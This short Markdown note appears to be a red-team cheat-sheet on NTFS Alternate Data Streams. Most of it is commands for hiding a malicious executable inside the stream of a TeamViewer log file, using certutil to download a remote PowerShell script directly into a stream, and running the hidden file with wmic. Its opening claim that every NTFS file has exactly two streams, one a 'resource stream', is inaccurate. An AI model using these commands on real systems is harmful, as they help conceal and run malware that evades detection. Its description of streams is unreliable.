### Alternate Data Streams:
- File on NTFS formatted drive has 2 streams:
  - Data stream: default stream - contains data
  - Resource stream: used for metadata
  - This is useful to hiding file
- Write to ADS
  -  `type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe" `
- Download directly into ADS
  -  `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt`
- Executing from ADS
  - `wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'`
  - NOTE: full path
- There are many other methods to add and execute
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f


